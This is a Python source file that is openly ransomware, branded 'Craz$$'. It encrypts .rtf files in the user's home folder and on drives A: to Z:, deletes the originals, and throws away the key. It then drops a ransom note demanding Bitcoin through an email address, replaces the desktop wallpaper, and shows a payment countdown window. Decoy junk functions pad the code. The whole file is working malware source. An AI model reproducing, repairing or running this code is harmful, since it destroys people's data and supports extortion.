import os
from cryptography.fernet import Fernet
import webbrowser
import ctypes
import urllib
import requests
import subprocess
import tkinter as tk
from tkinter import *
import tkinter
import tkinter.font as font
import datetime
import socket
from time import strftime
import win32com.client
import random
import time
from tkinter import Tk, Label, font
now = datetime.datetime.now()
a = now.strftime("%d/%m/%Y")
b = now.strftime("%H:%M:%S")
c = os.path.expanduser('~')
d = os.getlogin()
e = socket.gethostname()
f = socket.gethostbyname(e)
g = Fernet.generate_key()
h = Fernet(g)
i = [".rtf"]
import base64

def qwe(asd):
    zxc = asd.encode("utf-8")
    return zxc

def poi(asd):
    uio = base64.b64encode(asd)
    return uio

def jkl(asd):
    mnb = asd.decode("utf-8")
    return mnb

def fgh(asd):
    vbn = base64.b64decode(asd)
    return vbn

def rty(asd):
    xcf = "".join([c for c in asd if c not in "bcdfghjklmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ"])
    return xcf


def qwe(asd):
    zxc = asd[::-1]
    return zxc

def poi(asd):
    uio = "".join(random.sample(asd, len(asd)))
    return uio

def jkl(asd):
    mnb = "".join([chr(ord(c) + 1) for c in asd])
    return mnb

def fgh(asd):
    vbn = "".join([c for c in asd if c not in "aeiouAEIOU"])
    return vbn

def rty(asd):
    xcf = "".join([c for c in asd if c not in "bcdfghjklmnpqrstvwxyzBCDFGHJKLMNPQRSTVWXYZ"])
    return xcf

def yui(asd):
    qwe_result = qwe(asd)
    poi_result = poi(qwe_result)
    jkl_result = jkl(poi_result)
    fgh_result = fgh(jkl_result)
    rty_result = rty(fgh_result)
    return rty_result

def zxcvb():
    m = "mnop"
    n = [10, 11, 12]
    o = {"p": 13, "q": 14, "r": 15}
    p = (16, 17, 18)
    q = {"r": 19, "s": 20, "t": 21}
    for i in range(3):
        m = m[::-1]
        n = [j+i for j in n]
        o = {k: v+i for k, v in o.items()}
        p = tuple(j+i for j in p)
        q = {k: v-i for k, v in q.items()}
    return m, n, o, p, q

print(zxcvb())

def asdfg():
    a = True
    b = "def"
    c = {1: "one", 2: "two", 3: "three"}
    d = (4, 5, 6)
    e = {"f": 7, "g": 8, "h": 9}
    for i in range(5):
        a = not a
        b = b[::-1]
        c = {k: v[::-1] for k, v in c.items()}
        d = tuple(reversed(d))
        e = {k: v for k, v in e.items() if v % 2 == 0}
    return a, b, c, d, e

print(asdfg())

def qwerty():
    x = 5
    y = "abc"
    z = [1, 2, 3]
    for i in range(10):
        x *= 2
        y = y[::-1]
        z = [j**2 for j in z]
    return x, y, z





def foo():
    bar = []
    for i in range(random.randint(1, 100)):
        bar.append(i)
    return bar

def baz():
    qux = []
    for i in range(random.randint(1, 100)):
        qux.append(i)
    return qux

def foobarbazqux():
    fizz = []
    for i in range(random.randint(1, 100)):
        fizz.append(i)
    return fizz





try:
    for j, k, l in os.walk(c):
        for m in l:
            if m.endswith(tuple(i)):
                n = os.path.join(j, m)
                with open(n, "rb") as o:
                    p = o.read()
                    q = h.encrypt(p)
                with open(n + ".encrypted", "wb") as o:
                    o.write(q)
                os.remove(n)
except:
    print("ok")
try:

    for j, k, l in os.walk("D:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                o = os.path.join(j, m)
                with open(o, "rb") as p:
                    q = p.read()
                    r = h.encrypt(q)
                with open(o + ".encrypted", "wb") as p:
                    p.write(r)
                os.remove(o)
    for j, k, l in os.walk("E:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                s = os.path.join(j, m)
                with open(s, "rb") as p:
                    t = p.read()
                    u = h.encrypt(t)
                with open(s + ".encrypted", "wb") as p:
                    p.write(u)
                os.remove(s)
    for j, k, l in os.walk("F:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                v = os.path.join(j, m)
                with open(v, "rb") as p:
                    w = p.read()
                    x = h.encrypt(w)
                with open(v + ".encrypted", "wb") as p:
                    p.write(x)
                os.remove(v)

    
    for j, k, l in os.walk("A:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                y = os.path.join(j, m)
                with open(y, "rb") as p:
                    z = p.read()
                    aa = h.encrypt(z)
                with open(y + ".encrypted", "wb") as p:
                    p.write(aa)
                os.remove(y)
    for j, k, l in os.walk("B:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                ab = os.path.join(j, m)
                with open(ab, "rb") as p:
                    ac = p.read()
                    ad = h.encrypt(ac)
                with open(ab + ".encrypted", "wb") as p:
                    p.write(ad)
                os.remove(ab)
    for j, k, l in os.walk("G:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                ae = os.path.join(j, m)
                with open(ae, "rb") as p:
                    af = p.read()
                    ag = h.encrypt(af)
                with open(ae + ".encrypted", "wb") as p:
                    p.write(ag)
                os.remove(ae)


    for j, k, l in os.walk("H:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                ah = os.path.join(j, m)
                with open(ah, "rb") as p:
                    ai = p.read()
                    aj = h.encrypt(ai)
                with open(ah + ".encrypted", "wb") as p:
                    p.write(aj)
                os.remove(ah)
    for j, k, l in os.walk("I:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                ak = os.path.join(j, m)
                with open(ak, "rb") as p:
                    al = p.read()
                    am = h.encrypt(al)
                with open(ak + ".encrypted", "wb") as p:
                    p.write(am)
                os.remove(ak)
    for j, k, l in os.walk("J:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                an = os.path.join(j, m)
                with open(an, "rb") as p:
                    ao = p.read()
                    ap = h.encrypt(ao)
                with open(an + ".encrypted", "wb") as p:
                    p.write(ap)
                os.remove(an)


    for j, k, l in os.walk("K:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                aq = os.path.join(j, m)
                with open(aq, "rb") as p:
                    ar = p.read()
                    as_ = h.encrypt(ar)
                with open(aq + ".encrypted", "wb") as p:
                    p.write(as_)
                os.remove(aq)
    for j, k, l in os.walk("L:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                at = os.path.join(j, m)
                with open(at, "rb") as p:
                    au = p.read()
                    av = h.encrypt(au)
                with open(at + ".encrypted", "wb") as p:
                    p.write(av)
                os.remove(at)
    for j, k, l in os.walk("M:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                aw = os.path.join(j, m)
                with open(aw, "rb") as p:
                    ax = p.read()
                    ay = h.encrypt(ax)
                with open(aw + ".encrypted", "wb") as p:
                    p.write(ay)
                os.remove(aw)


    for j, k, l in os.walk("N:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                az = os.path.join(j, m)
                with open(az, "rb") as p:
                    ba = p.read()
                    bb = h.encrypt(ba)
                with open(az + ".encrypted", "wb") as p:
                    p.write(bb)
                os.remove(az)
    for j, k, l in os.walk("O:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                bc = os.path.join(j, m)
                with open(bc, "rb") as p:
                    bd = p.read()
                    be = h.encrypt(bd)
                with open(bc + ".encrypted", "wb") as p:
                    p.write(be)
                os.remove(bc)
    for j, k, l in os.walk("P:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                bf = os.path.join(j, m)
                with open(bf, "rb") as p:
                    bg = p.read()
                    bh = h.encrypt(bg)
                with open(bf + ".encrypted", "wb") as p:
                    p.write(bh)
                os.remove(bf)



    for j, k, l in os.walk("Q:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                bi = os.path.join(j, m)
                with open(bi, "rb") as p:
                    bj = p.read()
                    bk = h.encrypt(bj)
                with open(bi + ".encrypted", "wb") as p:
                    p.write(bk)
                os.remove(bi)
    for j, k, l in os.walk("R:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                bl = os.path.join(j, m)
                with open(bl, "rb") as p:
                    bm = p.read()
                    bn = h.encrypt(bm)
                with open(bl + ".encrypted", "wb") as p:
                    p.write(bn)
                os.remove(bl)
    for j, k, l in os.walk("S:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                bo = os.path.join(j, m)
                with open(bo, "rb") as p:
                    bp = p.read()
                    bq = h.encrypt(bp)
                with open(bo + ".encrypted", "wb") as p:
                    p.write(bq)
                os.remove(bo)



    for j, k, l in os.walk("T:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                br = os.path.join(j, m)
                with open(br, "rb") as p:
                    bs = p.read()
                    bt = h.encrypt(bs)
                with open(br + ".encrypted", "wb") as p:
                    p.write(bt)
                os.remove(br)
    for j, k, l in os.walk("U:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                bu = os.path.join(j, m)
                with open(bu, "rb") as p:
                    bv = p.read()
                    bw = h.encrypt(bv)
                with open(bu + ".encrypted", "wb") as p:
                    p.write(bw)
                os.remove(bu)
    for j, k, l in os.walk("V:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                bx = os.path.join(j, m)
                with open(bx, "rb") as p:
                    by = p.read()
                    bz = h.encrypt(by)
                with open(bx + ".encrypted", "wb") as p:
                    p.write(bz)
                os.remove(bx)



    for j, k, l in os.walk("W:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                btz = os.path.join(j, m)
                with open(btz, "rb") as f:
                    bzy = f.read()
                    baz = h.encrypt(bzy)
                with open(btz + ".encrypted", "wb") as f:
                    f.write(baz)
                os.remove(bzy)

    for j, k, l in os.walk("X:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                btzy = os.path.join(j, m)
                with open(btzy, "rb") as f:
                    bzya = f.read()
                    bazz = h.encrypt(bzya)
                with open(btzy + ".encrypted", "wb") as f:
                    f.write(bazz)
                os.remove(bzya)



    for j, k, l in os.walk("Y:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                btzyy = os.path.join(j, m)
                with open(btzyy, "rb") as f:
                    bzyaa = f.read()
                    baazz = h.encrypt(bzyaa)
                with open(btzyy + ".encrypted", "wb") as f:
                    f.write(baazz)
                os.remove(bzyaa)


    for j, k, l in os.walk("Z:\\"):
        for m in l:
            if m.endswith(tuple(i)):
                btzyaz = os.path.join(j, m)
                with open(btzyaz, "rb") as f:
                    bzya = f.read()
                    bazz = h.encrypt(bzya)
                with open(btzyaz + ".encrypted", "wb") as f:
                    f.write(bazz)
                os.remove(bzya)

except:
    print("ok")
try:
        with open (f"C:/Users/{d}/READ_me.txt", "w") as f:
            f.write('''Hi it's Craz$$, you just got hacked on {}  at  {}.\nThe harddisks of your computer have been encrypted with an Military grade encryption algorithm.
There is no way to restore your data without a special key.
Only we can decrypt your files!
To purchase your key and restore your data, please follow these three easy steps:
1. Email the file called TheKey.txt at C:/Users/Your_name/EMAIL_ME.txt to GetYourFilesBack@protonmail.com
2. You will recieve your personal BTC address for payment.
Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
We will check to see if payment has been paid.
3. You will receive a text file with your KEY that will unlock all your files. 
IMPORTANT: To decrypt your files, place text file on desktop and wait. Shortly after it will begin to decrypt all files.
WARNING:
Do NOT attempt to decrypt your files with any software as it is obselete and will not work, and may cost you more to unlcok your files.
Do NOT change file names, mess with the files, or run deccryption software as it will cost you more to unlock your files-
-and there is a high chance you will lose your files forever.
Do NOT send "PAID" button without paying, price WILL go up for disobedience.
Do NOT think that we wont delete your files altogether and throw away the key if you refuse to pay. WE WILL.
To finish, when the countdown will be done all of the keys will be destroy so all of your files will be lost !'''.format(a, b))
            f.close()


        with open (f"C:/Users/{d}/TheKey.txt", "w") as fa:
            fa.write(''' --THE BEGINNINGG OF THE KEY--
MIICkzANBgkqhkiG9w0BAQEFAAOCAoAAMIICewKCAnIA1BWKOCAft/zE1DgzsHEo
BADuBwHfACLZJnL04veWiQ8/PobEmpJNn2mkaRSNbA5mZtHp3NcU7uxodKBYvrXt
Wc/n0IOIxtWySznpVB9aNBBWQMbNfeGZXvA5/gbwI+Ru0/vRsBAFvO+R/OJ48aQ2
Gk0l3biCC8jkHqcoIbvr7ML9oOGWxgcsjv/ABcYlbEMECFdO4Ir54j84wiFQYuU6
Gu/zLr7kAf9CYYwhaslAqQDGTx3m1aSynZaN6ZvrXffFznMy55iZdVUpPpmBjLb3
lgEsVOxllNFITThMu+56GvtRzjiuwsIoEU3Vi90JKOP08cldrVWrRdkObriJLYw9
pZBKHY+WNrI9m+10LVDER1YOSNGttt7ZtGJ0aBwN7d7YXmb2Ps3JVcfTR8mEcO9G
28DfqKU00W1Y2om4rLNC3RRfyXyTzFUVBGFGT6wGDepIKhTA2Xku4NzMhVEWLxof
a+wGNADY3zaBK30hR6xaOAsCYadrMaQGazvVRf9VprPsO6h+kqHh5PF+qGjfCJsr
pkoDcKXKV1idik7hCDGCl3nmf2au5GakaUgS3arpV+V5Vyix/55O+7WocxQVFRza
/mEleY3I28eC3MiSS9hb+hpb3GrSy6Ams/kz5X5EQenGCCs+JLhwZjJ+R+90Kaw2
fig3WBpGO5Zu7qG/FB4xy/AV56Q1zZLnfSESx+DWkBmeuW9CEDiSgkLrgTgwE8iy
xoK5vMGEdBDr1KelJKLCO0caZNAP3XhVgc9iwnjI1lT8ialfjkJAHp/+MxgnTPNZ
i8c0qKw7VVu3H5PVA+5OfkO5f/idrf7EIdiyEClghvzcmwIDAQAB
    --THE END OF THE KEY--''')
            fa.close()


        with open (f"C:/Users/{d}/How_protect_yourself.txt", "w") as fe:
            fe.write('''Hello,
So, today you are a victim of a Ransomware.
To start what is a Ransomware ?
Ransomware is a virus who encrypt all of your files on all hard drives. Generally the attacker(s) request you some money for decrypt the files.
But some time the attackers don't decrypt your files even if you have paid.
How protect yourself ?
To protect yourself you must know what files you executed and know what is inside, for don't have some suprises like right now.
In a compagny the person who can spread a virus is mainly the secretary, so this person must know the hazard of virus on computer and the damage it can cause.
All of the people in a compagny must learn how to protect yourself by learning about cybersecurity.

It was the cybercriminal group Craz$$.
Have a nice day.
    ''')
        fe.close()
    
except:
    print("ok1")

webbrowser.open("https://bitcoin.org/en/")


try:
    imageUrl = 'https://www.ensitech.eu/wp-content/uploads/2020/08/1920x1280-ransomwares.jpg'
        
    path = f"C:/Users/{d}/Craz$$_Ransomware.jpg"
    urllib.request.urlretrieve(imageUrl, path)
    SPI_SETDESKWALLPAPER = 20
            
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, path, 0)
    

except:
    print("ok")


countdown_duration = 2 * 24 * 60 * 60

current_time = time.time()
end_time = current_time + countdown_duration

window = Tk()

text3 = Label(window, text="")
text3.pack()
    
def update_label():
        time_remaining = end_time - time.time()
        days_remaining = int(time_remaining // (24 * 60 * 60))
        hours_remaining = int((time_remaining % (24 * 60 * 60)) // (60 * 60))
        minutes_remaining = int((time_remaining % (60 * 60)) // 60)
        seconds_remaining = int(time_remaining % 60)
            
        text3.config(text=f"You have : {days_remaining} days, {hours_remaining} hours, {minutes_remaining} minutes and {seconds_remaining} secondes remaining for pay.\n", fg="yellow", bg="black")
        window.after(1000, update_label)
            
F = font.Font(family='Prompt', size=18, weight="bold")
text3['font'] = F
text3.pack()

update_label()

window.title("Craz$$")
window.config(bg="black")
window.geometry("1000x700")

label2 = Label(window, text="Hi We are Craz$$ !", font=("Prompt", 45), fg="red", bg="black")
label2.pack()

text = Label(text='''\n\n\n\nWe are a cyber criminal organisation.\n\n\n Expect Us.\n\n\n Your pc have been hacked ! (find the file READ_me.txt for more precision)''', fg="red", bg="black")
text2 = Label(text="\n\n\nWe are not playing with you !", fg="red", bg="black")

f = font.Font(family='Prompt', size=25, weight="bold")
text['font'] = f
text.pack()

f2 = font.Font(family='Prompt', size=25, weight="bold")
text2['font'] = f2
text2.pack()

window.mainloop()